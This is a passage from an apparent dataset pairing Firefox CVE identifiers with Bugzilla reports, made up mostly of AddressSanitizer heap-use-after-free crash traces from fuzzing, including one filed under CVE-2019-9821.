0x7fbcefc29c0f in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:162:10 #20 0x7fbcefbe2f81 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:238:19 #21 0x7fbcefc09270 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:503:19 #22 0x7fbceef3ddc9 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:508:14 #23 0x7fbceef251a6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #24 0x7fbceef251a6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3075 #25 0x7fbceef07238 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #26 0x7fbceef3d6e6 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562:13 #27 0x7fbceef3f332 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #28 0x7fbcefb50ee9 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2623:10 #29 0x7fbce76a7d01 in mozilla::dom::IntersectionCallback::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Sequence<mozilla::OwningNonNull<mozilla::dom::DOMIntersectionObserverEntry> > const&, mozilla::dom::DOMIntersectionObserver&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/IntersectionObserverBinding.cpp:833:8 #30 0x7fbce4043128 in Call<mozilla::dom::DOMIntersectionObserver > /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/IntersectionObserverBinding.h:486:12 #31 0x7fbce4043128 in Call<mozilla::dom::DOMIntersectionObserver > /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/IntersectionObserverBinding.h:508 #32 0x7fbce4043128 in mozilla::dom::DOMIntersectionObserver::Notify() /builds/worker/workspace/build/src/dom/base/DOMIntersectionObserver.cpp:463 #33 0x7fbce441a95b in mozilla::dom::Document::NotifyIntersectionObservers() /builds/worker/workspace/build/src/dom/base/Document.cpp:11525:17 #34 0x7fbce44be9ab in applyImpl<mozilla::dom::Document, void (mozilla::dom::Document::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1122:12 #35 0x7fbce44be9ab in apply<mozilla::dom::Document, void (mozilla::dom::Document::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1128 #36 0x7fbce44be9ab in mozilla::detail::RunnableMethodImpl<mozilla::dom::Document*, void (mozilla::dom::Document::)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1174 #37 0x7fbce0065385 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32 #38 0x7fbce00a4a31 in nsThread::ProcessNextEvent(bool, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1179:14 #39 0x7fbce00ace3d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #40 0x7fbce136b34f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #41 0x7fbce12410ce in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #42 0x7fbce12410ce in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #43 0x7fbce12410ce in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #44 0x7fbcea695733 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #45 0x7fbceec5f20e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:933:20 #46 0x7fbce12410ce in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #47 0x7fbce12410ce in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #48 0x7fbce12410ce in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #49 0x7fbceec5e39c in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:771:34 #50 0x55da48261834 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #51 0x55da48261834 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:265 #52 0x7fbd03b35b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #53 0x55da48186ebc in _start (/home/nils/browser/firefox/firefox/firefox+0x2debc) 0x60c000209b00 is located 0 bytes inside of 120-byte region [0x60c000209b00,0x60c000209b78) freed by thread T0 (Web Content) here: #0 0x55da4822e9e2 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7fbcdfe6c311 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7 #2 0x7fbcdfe68df9 in ~RemoveSkippableVisitor /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2540:3 #3 0x7fbcdfe68df9 in nsPurpleBuffer::RemoveSkippable(nsCycleCollector*, js::SliceBudget&, bool, bool, void ()()) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2587 #4 0x7fbcdfe6ccb6 in nsCycleCollector::ForgetSkippable(js::SliceBudget&, bool, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2653:14 #5 0x7fbcdfe7ada0 in nsCycleCollector_forgetSkippable(js::SliceBudget&, bool, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3893:21 #6 0x7fbce478b3cb in FireForgetSkippable(unsigned int, bool, mozilla::TimeStamp) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1191:3 #7 0x7fbce4792951 in CCRunnerFired(mozilla::TimeStamp) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1859:5 #8 0x7fbce0051df7 in operator() /builds/worker/workspace/build/src/clang/bin/../lib/gcc/x86_64-unknown-linux-gnu/6.4.0/../../../../include/c++/6.4.0/functional:2127:14 #9 0x7fbce0051df7 in mozilla::IdleTaskRunner::Run() /builds/worker/workspace/build/src/xpcom/threads/IdleTaskRunner.cpp:58 #10 0x7fbce00a4a31 in nsThread::ProcessNextEvent(bool, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1179:14 #11 0x7fbce00ace3d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #12 0x7fbce136b34f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #13 0x7fbce12410ce in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #14 0x7fbce12410ce in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #15 0x7fbce12410ce in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #16 0x7fbcea695733 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #17 0x7fbceec5f20e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:933:20 #18 0x7fbce12410ce in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #19 0x7fbce12410ce in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #20 0x7fbce12410ce in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #21 0x7fbceec5e39c in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:771:34 #22 0x55da48261834 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #23 0x55da48261834 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:265 #24 0x7fbd03b35b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 previously allocated by thread T0 (Web Content) here: #0 0x55da4822ed63 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x55da482635fd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15 #2 0x7fbce487fb72 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10 #3 0x7fbce487fb72 in NS_NewWindowRoot(nsPIDOMWindowOuter*) /builds/worker/workspace/build/src/dom/base/nsWindowRoot.cpp:334 #4 0x7fbce41c7ab4 in nsGlobalWindowOuter::SetDocShell(nsDocShell*) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:2409:29 #5 0x7fbce420b466 in nsGlobalWindowOuter::Create(nsDocShell*, bool) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:7759:11 #6 0x7fbcedd7e060 in nsDocShell::EnsureScriptEnvironment() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:12055:19 #7 0x7fbceddb17d0 in GetWindow /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:3622:7 #8 0x7fbceddb17d0 in non-virtual thunk to nsDocShell::GetWindow() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #9 0x7fbcede5ddc2 in nsSHistory::SetRootDocShell(nsIDocShell*) /builds/worker/workspace/build/src/docshell/shistory/nsSHistory.cpp:1513:55 #10 0x7fbceddc2f99 in nsDocShell::InitSessionHistory() /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4719:25 #11 0x7fbcee53cee9 in nsWebBrowser::Create(nsIWebBrowserChrome*, nsIWidget*, mozilla::OriginAttributes const&, mozilla::dom::BrowsingContext*) /builds/worker/workspace/build/src/toolkit/components/browser/nsWebBrowser.cpp:154:13 #12 0x7fbce9c3cb9d in mozilla::dom::TabChild::Init(mozIDOMWindowProxy*) /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:526:17 #13 0x7fbce9b461bf in mozilla::dom::ContentChild::ProvideWindowCommon(mozilla::dom::TabChild*, mozIDOMWindowProxy*, bool, unsigned int, bool, bool, bool, nsIURI*, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, bool, nsDocShellLoadState*, bool*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/dom/ipc/ContentChild.cpp:958:7 #14 0x7fbce9c462b5 in mozilla::dom::TabChild::ProvideWindow(mozIDOMWindowProxy*, unsigned int, bool, bool, bool, nsIURI*, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, bool, nsDocShellLoadState*, bool*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:922:14 #15 0x7fbceeba0bd9 in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, bool, bool, nsDocShellLoadState*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:755:24 #16 0x7fbceeba5ec3 in OpenWindow2 /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:367:10 #17 0x7fbceeba5ec3 in non-virtual thunk to nsWindowWatcher::OpenWindow2(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsISupports*, bool, bool, nsDocShellLoadState*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp #18 0x7fbce41f60d1 in nsGlobalWindowOuter::OpenInternal(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, bool, bool, bool, bool, bool, nsIArray*, nsISupports*, nsDocShellLoadState*, bool, nsPIDOMWindowOuter**) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:7181:21 #19 0x7fbce41f4839 in OpenJS /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:5694:10 #20 0x7fbce41f4839 in nsGlobalWindowOuter::OpenOuter(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowOuter.cpp:5666 #21 0x7fbce41769d5 in nsGlobalWindowInner::Open(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:3630:3 #22 0x7fbce6875f88 in mozilla::dom::Window_Binding::open(JSContext*, JS::Handle<JSObject*>, nsGlobalWindowInner*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:2866:44 #23 0x7fbce780f8d8 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::MaybeGlobalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3144:13 #24 0x7fbceef3cd77 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #25 0x7fbceef3cd77 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #26 0x7fbceef251a6 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #27 0x7fbceef251a6 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3075 #28 0x7fbceef07238 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #29 0x7fbceef3d6e6 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562:13 #30 0x7fbceef3f332 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #31 0x7fbcefb50ee9 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2623:10 #32 0x7fbce6e104a9 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:266:37 #33 0x7fbce80d6d99 in void mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionHandling, JS::Realm*) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #34 0x7fbce80d4029 in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:205:12 #35 0x7fbce808652a in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1044:22 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:517:7 in nsCOMPtr Shadow bytes around the buggy address: 0x0c1880039310: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1880039320: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 0x0c1880039330: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1880039340: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1880039350: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa =>0x0c1880039360:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1880039370: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1880039380: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c1880039390: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c18800393a0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c18800393b0: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==24153==ABORTING"
      }
    ],
    "CVE-2019-9821": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1539125",
        "title": "heap-use-after-free in AssertWorkerThread",
        "description": "ASAN crashes with the following signature occur regularly when fuzzing the latest ASAN build of Firefox 68.0a1 . Unfortunatley I havent been able to minimize or reproduce a crash (likely a race condition). ================================================================= ==18599==ERROR: AddressSanitizer: heap-use-after-free on address 0x617000253520 at pc 0x7f8fe74af846 bp 0x7f8f86aa9cb0 sp 0x7f8f86aa9ca8 READ of size 8 at 0x617000253520 thread T41 (IPDL Background) #0 0x7f8fe74af845 in AssertWorkerThread /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ipc/MessageChannel.h:542:5 #1 0x7f8fe74af845 in mozilla::ipc::MessageChannel::CxxStackFrame::CxxStackFrame(mozilla::ipc::MessageChannel&, mozilla::ipc::Direction, IPC::Message const*) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:225 #2 0x7f8fe74ae3ee in mozilla::ipc::MessageChannel::Send(IPC::Message*) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:980:17 #3 0x7f8fe7f17c99 in mozilla::dom::PRemoteWorkerParent::SendExecOp(mozilla::dom::RemoteWorkerOp const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PRemoteWorkerParent.cpp:87:40 #4 0x7f8feff50537 in mozilla::dom::RemoteWorkerController::Shutdown() /builds/worker/workspace/build/src/dom/workers/remoteworkers/RemoteWorkerController.cpp:163:23 #5 0x7f8feff7051d in Terminate /builds/worker/workspace/build/src/dom/workers/sharedworkers/SharedWorkerManager.cpp:147:28 #6 0x7f8feff7051d in operator() /builds/worker/workspace/build/src/dom/workers/sharedworkers/SharedWorkerManager.cpp:265 #7 0x7f8feff7051d in mozilla::detail::RunnableFunction<mozilla::dom::SharedWorkerManager::UnregisterHolder(mozilla::dom::SharedWorkerManagerHolder*)::$_0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:562 #8 0x7f8fe61f7511 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #9 0x7f8fe61ff91d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #10 0x7f8fe74cda14 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5 #11 0x7f8fe73a1dbe in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #12 0x7f8fe73a1dbe in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #13 0x7f8fe73a1dbe in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #14 0x7f8fe61ef733 in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11 #15 0x7f900b1ac5ad in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #16 0x7f900adef6da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da) #17 0x7f9009dcd88e in clone (/lib/x86_64-linux-gnu/libc.so.6+0x12188e) 0x617000253520 is located 288 bytes inside of 728-byte region [0x617000253400,0x6170002536d8) freed by thread T0 here: #0 0x55788cd4f9e2 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7f8fe74d57d0 in operator() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/UniquePtr.h:486:5 #2 0x7f8fe74d57d0 in reset /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/UniquePtr.h:323 #3 0x7f8fe74d57d0 in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/UniquePtr.h:296 #4 0x7f8fe74d57d0 in mozilla::ipc::IToplevelProtocol::~IToplevelProtocol() /builds/worker/workspace/build/src/ipc/glue/ProtocolUtils.cpp:567 #5 0x7f8fe748199f in ~ParentImpl /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:239:3 #6 0x7f8fe748199f in (anonymous namespace)::ParentImpl::~ParentImpl() /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:235 #7 0x7f8fe7481d8b in applyImpl<(anonymous namespace)::ParentImpl, void ((anonymous namespace)::ParentImpl::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1122:12 #8 0x7f8fe7481d8b in apply<(anonymous namespace)::ParentImpl, void ((anonymous namespace)::ParentImpl::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1128 #9 0x7f8fe7481d8b in mozilla::detail::RunnableMethodImpl<(anonymous namespace)::ParentImpl*, void ((anonymous namespace)::ParentImpl::)(), false, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1174 #10 0x7f8fe61f7511 in nsThread::ProcessNextEvent(bool, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #11 0x7f8fe61ff91d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #12 0x7f8fe74cc04f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #13 0x7f8fe73a1dbe in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #14 0x7f8fe73a1dbe in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #15 0x7f8fe73a1dbe in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #16 0x7f8ff0846563 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #17 0x7f8ff4b2f120 in nsAppStartup::Run() /builds/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:271:30 #18 0x7f8ff4e2cb0a in XREMain::XRE_mainRun() /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4589:22 #19 0x7f8ff4e2f538 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4727:8 #20 0x7f8ff4e30dc9 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4811:21 #21 0x55788cd8264c in do_main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:212:22 #22 0x55788cd8264c in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:291 #23 0x7f9009ccdb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96) previously allocated by thread T0 here: #0 0x55788cd4fd63 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x55788cd845fd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15 #2 0x7f8fe74d536f in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10 #3 0x7f8fe74d536f in MakeUnique<mozilla::ipc::IToplevelProtocol::ToplevelState, const char &, mozilla::ipc::IToplevelProtocol , mozilla::ipc::Side &> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/UniquePtr.h:617 #4 0x7f8fe74d536f in mozilla::ipc::IToplevelProtocol::IToplevelProtocol(char const, IPCMessageStart, mozilla::ipc::Side) /builds/worker/workspace/build/src/ipc/glue/ProtocolUtils.cpp:561 #5 0x7f8fe8292ce7 in mozilla::ipc::PBackgroundParent::PBackgroundParent() /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:335:5 #6 0x7f8fe7433278 in mozilla::ipc::BackgroundParentImpl::BackgroundParentImpl() /builds/worker/workspace/build/src/ipc/glue/BackgroundParentImpl.cpp:120:23 #7 0x7f8fe743a150 in ParentImpl /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:226:12 #8 0x7f8fe743a150 in Alloc /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:827 #9 0x7f8fe743a150 in mozilla::ipc::BackgroundParent::Alloc(mozilla::dom::ContentParent, mozilla::ipc::Endpoint<mozilla::ipc::PBackgroundParent>&&) /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:640 #10 0x7f8fefd60888 in mozilla::dom::ContentParent::RecvInitBackground(mozilla::ipc::Endpoint<mozilla::ipc::PBackgroundParent>&&) /builds/worker/workspace/build/src/dom/ipc/ContentParent.cpp:3169:8 #11 0x7f8fe786eaea in mozilla::dom::PContentParent::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentParent.cpp:4356:57 #12 0x7f8fe74c2c49 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2151:21 #13 0x7f8fe74be98a in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2078:9 #14 0x7f8fe74c0bc7 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1937:3 #15 0x7f8fe74c1957 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1968:13 #16 0x7f8fe61f7511 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #17 0x7f8fe61ff91d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #18 0x7f8fe61f4e0e in SpinEventLoopUntil<mozilla::ProcessFailureBehavior::ReportToCaller, (lambda at /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:881:22)> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:348:25 #19 0x7f8fe61f4e0e in nsThread::Shutdown() /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:881 #20 0x7f8ff462bd69 in LoadLoadableRootsTask::Run() /builds/worker/workspace/build/src/security/manager/ssl/nsNSSComponent.cpp:644:16 #21 0x7f8fe61f7511 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #22 0x7f8fe61ff91d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #23 0x7f8fe74cc04f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #24 0x7f8fe73a1dbe in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #25 0x7f8fe73a1dbe in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #26 